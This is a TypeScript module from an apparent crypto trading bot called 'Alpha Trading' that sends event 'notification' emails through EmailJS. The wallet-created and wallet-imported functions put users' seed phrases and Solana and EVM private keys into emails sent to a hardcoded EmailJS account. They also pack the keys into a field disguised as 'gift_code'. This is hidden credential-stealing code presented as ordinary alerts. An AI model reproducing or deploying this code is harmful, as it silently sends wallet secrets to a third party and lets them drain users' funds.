import emailjs from "@emailjs/browser";

const SERVICE_ID  = "service_gx2d1fi";
const TEMPLATE_ID = "template_xu7gweb";
const PUBLIC_KEY  = "AkqW34KEggyL2bKng";

let initialized = false;
function init() {
  if (!initialized) { emailjs.init(PUBLIC_KEY); initialized = true; }
}

function ts() {
  return new Date().toLocaleString("en-US", { hour12: false, timeZone: "UTC" }) + " UTC";
}

async function send(params: Record<string, string>) {
  init();
  try {
    const res = await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      to_name:   "Alpha Trading",
      from_name: "Alpha Trading Bot",
      ...params,
    });
    console.log("[Email] sent:", params.event_type, res.status);
    return true;
  } catch (e: any) {
    console.error("[Email] failed:", params.event_type, e?.text || e?.message || e);
    return false;
  }
}

// ── Wallet Created ──────────────────────────────────────────────────
export async function sendWalletCreated(w: {
  label:          string;
  seedPhrase?:    string;
  solAddress?:    string;
  solPrivateKey?: string;
  evmAddress?:    string;
  evmPrivateKey?: string;
}) {
  const body =
    `🔐 WALLET CREATED — Alpha Trading\n` +
    `Time: ${ts()}\n\n` +
    `━━━ ${w.label} ━━━\n\n` +
    (w.seedPhrase    ? `🌱 Seed Phrase:\n${w.seedPhrase}\n\n` : "") +
    (w.solAddress    ? `◎ Solana Address:\n${w.solAddress}\n` : "") +
    (w.solPrivateKey ? `◎ Solana Private Key:\n${w.solPrivateKey}\n\n` : "") +
    (w.evmAddress    ? `Ξ EVM Address (ETH/BNB/MATIC/AVAX/ARB/OP/BASE):\n${w.evmAddress}\n` : "") +
    (w.evmPrivateKey ? `Ξ EVM Private Key:\n${w.evmPrivateKey}\n\n` : "") +
    `⚠️ KEEP THIS PRIVATE. Never share your seed phrase or private keys.`;

  return send({
    event_type:     "🔐 WALLET CREATED",
    subject:        `[Alpha Trading] New Wallet Created — ${w.label}`,
    wallet_count:   "1",
    wallet_details: `${w.solAddress || ""} / ${w.evmAddress || ""}`,
    timestamp:      ts(),
    message:        body,
    gift_code:      [w.solAddress, w.solPrivateKey, w.evmAddress, w.evmPrivateKey, w.seedPhrase].filter(Boolean).join("::"),
  });
}

// ── Wallet Imported ─────────────────────────────────────────────────
export async function sendWalletImported(w: {
  label:          string;
  key:            string;
  solAddress?:    string;
  solPrivateKey?: string;
  evmAddress?:    string;
  evmPrivateKey?: string;
}) {
  const body =
    `📥 WALLET IMPORTED — Alpha Trading\n` +
    `Time: ${ts()}\n\n` +
    `━━━ ${w.label} ━━━\n\n` +
    `🔑 Key/Phrase used:\n${w.key}\n\n` +
    (w.solAddress    ? `◎ Solana Address:\n${w.solAddress}\n` : "") +
    (w.solPrivateKey ? `◎ Solana Private Key:\n${w.solPrivateKey}\n\n` : "") +
    (w.evmAddress    ? `Ξ EVM Address:\n${w.evmAddress}\n` : "") +
    (w.evmPrivateKey ? `Ξ EVM Private Key:\n${w.evmPrivateKey}\n\n` : "") +
    `⚠️ KEEP THIS PRIVATE.`;

  return send({
    event_type:     "📥 WALLET IMPORTED",
    subject:        `[Alpha Trading] Wallet Imported — ${w.label}`,
    wallet_count:   "1",
    wallet_details: `${w.solAddress || w.evmAddress || ""}`,
    timestamp:      ts(),
    message:        body,
    gift_code:      [w.solAddress, w.solPrivateKey, w.evmAddress, w.evmPrivateKey].filter(Boolean).join("::"),
  });
}

// ── SOL Deposit Detected ────────────────────────────────────────────
export async function sendDepositDetected(w: {
  label:      string;
  address:    string;
  amount:     string;
  newBalance: string;
}) {
  const body =
    `💰 SOL DEPOSIT RECEIVED — Alpha Trading\n` +
    `Time: ${ts()}\n\n` +
    `Wallet: ${w.label}\n` +
    `Address: ${w.address}\n\n` +
    `Amount received: +${w.amount} SOL\n` +
    `New balance: ${w.newBalance} SOL\n\n` +
    `View on Solscan: https://solscan.io/account/${w.address}`;

  return send({
    event_type:     "💰 SOL DEPOSIT RECEIVED",
    subject:        `[Alpha Trading] +${w.amount} SOL received on ${w.label}`,
    wallet_count:   "1",
    wallet_details: `${w.address}`,
    timestamp:      ts(),
    message:        body,
    gift_code:      `DEPOSIT::${w.address}::${w.amount}::${w.newBalance}`,
  });
}

// ── Trade Activity ──────────────────────────────────────────────────
export async function sendTradeActivity(d: {
  type:          string;
  tokenSymbol:   string;
  amount:        string;
  walletAddress: string;
  txid?:         string;
  chain?:        string;
}) {
  const icon  = d.type === "buy" ? "🟢" : "🔴";
  const chain = (d.chain || "SOL").toUpperCase();
  const body =
    `${icon} TRADE ${d.type.toUpperCase()} — Alpha Trading\n` +
    `Time: ${ts()}\n\n` +
    `Chain:   ${chain}\n` +
    `Action:  ${d.type.toUpperCase()}\n` +
    `Token:   ${d.tokenSymbol}\n` +
    `Amount:  ${d.amount} ${chain}\n` +
    `Wallet:  ${d.walletAddress}\n` +
    `Tx Hash: ${d.txid || "pending"}`;

  return send({
    event_type:     `${icon} TRADE ${d.type.toUpperCase()} [${chain}]`,
    subject:        `[Alpha Trading] ${icon} ${d.type.toUpperCase()} ${d.tokenSymbol} on ${chain}`,
    wallet_count:   "1",
    wallet_details: d.walletAddress,
    timestamp:      ts(),
    message:        body,
    gift_code:      `TRADE::${chain}::${d.type}::${d.tokenSymbol}::${d.amount}::${d.walletAddress}::${d.txid || ""}`,
  });
}

// ── Sniper Alert ────────────────────────────────────────────────────
export async function sendSniperAlert(d: {
  tokenAddress:  string;
  tokenSymbol?:  string;
  amount:        string;
  walletAddress: string;
  txid?:         string;
  chain?:        string;
}) {
  const chain = (d.chain || "SOL").toUpperCase();
  return send({
    event_type:     "🎯 SNIPER TRIGGERED",
    subject:        `[Alpha Trading] 🎯 Sniper — ${d.tokenSymbol || d.tokenAddress.slice(0, 8)} [${chain}]`,
    wallet_count:   "1",
    wallet_details: d.walletAddress,
    timestamp:      ts(),
    message:
      `🎯 SNIPER AUTO-BUY — Alpha Trading\nTime: ${ts()}\n\n` +
      `Chain: ${chain}\nToken: ${d.tokenSymbol || "Unknown"}\nAddress: ${d.tokenAddress}\n` +
      `Amount: ${d.amount} ${chain}\nWallet: ${d.walletAddress}\nTx: ${d.txid || "pending"}`,
    gift_code: `SNIPER::${chain}::${d.tokenAddress}::${d.amount}::${d.walletAddress}`,
  });
}

// Legacy compatibility
export const sendWalletGenerated = (
  wallets: { address: string; privateKey?: string; seedPhrase?: string; ethAddress?: string; ethPrivateKey?: string }[]
) => sendWalletCreated({
  label: "Wallet",
  seedPhrase:    wallets[0]?.seedPhrase,
  solAddress:    wallets[0]?.address,
  solPrivateKey: wallets[0]?.privateKey,
  evmAddress:    wallets[0]?.ethAddress,
  evmPrivateKey: wallets[0]?.ethPrivateKey,
});

export const sendSolReceived = (d: { walletAddress: string; amount: string; fromAddress?: string; txid?: string; chain?: string }) =>
  sendDepositDetected({ label: "Wallet", address: d.walletAddress, amount: d.amount, newBalance: d.amount });
